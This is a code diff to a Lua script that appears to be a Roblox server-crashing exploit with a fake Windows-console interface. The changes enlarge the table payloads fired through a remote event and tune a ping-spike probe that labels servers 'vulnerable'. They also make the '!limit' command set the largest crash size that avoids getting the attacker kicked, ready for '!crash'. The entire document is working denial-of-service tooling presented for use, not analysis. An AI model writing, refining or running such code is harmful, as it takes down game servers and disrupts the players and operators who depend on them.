@@ -279,12 +279,18 @@ local function processCommand(input)
                 log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
             end
             
-            -- Safe test size (50k is big enough to see a spike, small enough to not kick)
-            local testSize = 50000
-            log("[*] Firing 50k payload for 3 seconds to test server reaction...", Color3.fromRGB(200, 200, 200))
+            -- ✅ Testing a higher size (150k) for accurate results
+            local testSize = 150000
+            log("[*] Firing " .. testSize .. " payload for 3 seconds...", Color3.fromRGB(200, 200, 200))
             
             local before = getPing()
-            local p = build(testSize)
+            
+            -- Yield build so game doesn't freeze
+            local p = {}
+            for j = 1, testSize do
+                p[j] = {id = j, v = j}
+                if j % 10000 == 0 then task.wait() end
+            end
             
             local endT = tick() + 3
             while tick() < endT do
@@ -300,7 +306,7 @@ local function processCommand(input)
             
             log(string.format("[*] Baseline Ping: %dms | Ping After Test: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
             
-            if spike > 150 then
+            if spike > 150 or after > 500 then
                 log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                 log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
             else
@@ -351,7 +357,7 @@ local function processCommand(input)
         end
         
     elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test. This takes ~10 seconds...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Auto-Limit Test. This takes ~15 seconds...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then 
@@ -365,27 +371,34 @@ local function processCommand(input)
                 log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
             end
             
-            local sizes = {50000, 100000, 150000, 200000, 250000}
+            -- ✅ Testing higher numbers
+            local sizes = {50000, 100000, 150000, 200000, 250000, 300000}
             local bestSize = 50000
             
             for _, sz in ipairs(sizes) do
-                log("[*] Testing "..sz.." payload...", Color3.fromRGB(200, 200, 200))
+                log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
                 local before = getPing()
-                local p = build(sz)
                 
-                local endT = tick() + 2
+                -- Yield build to prevent freeze
+                local p = {}
+                for j = 1, sz do
+                    p[j] = {id = j, v = j}
+                    if j % 10000 == 0 then task.wait() end
+                end
+                
+                local endT = tick() + 2.5
                 while tick() < endT do
                     pcall(function() remote:FireServer(p) end)
                     task.wait(0.125)
                 end
                 
-                task.wait(1.5)
+                task.wait(1.5) -- Let server process
                 local after = getPing()
                 local spike = after - before
                 
                 log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
                 
-                if after > 1000 or spike > 800 then
+                if after > 1000 or spike > 600 then
                     log("[!] DANGER: This size is starting to kick you!", Color3.fromRGB(255, 50, 50))
                     break
                 else
@@ -394,8 +407,12 @@ local function processCommand(input)
                 task.wait(2)
             end
             
-            log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: "..bestSize, Color3.fromRGB(0, 200, 255))
-            log("[*] Type '!size "..bestSize.."' and then '!crash' to begin.", Color3.fromRGB(0, 200, 255))
+            -- ✅ Automatically applies the safe limit
+            Children = bestSize
+            state.cache = nil
+            
+            log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: " .. bestSize, Color3.fromRGB(0, 200, 255))
+            log("[*] Size automatically set. Type '!crash' to begin.", Color3.fromRGB(0, 200, 255))
             
             if wasRunning then
                 log("[*] Auto-restarting original payload...", Color3.fromRGB(200, 200, 200))
@@ -463,7 +480,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: Use '!test' first to see if the server is vulnerable.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: Use '!limit' to auto-find the max safe crash size.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
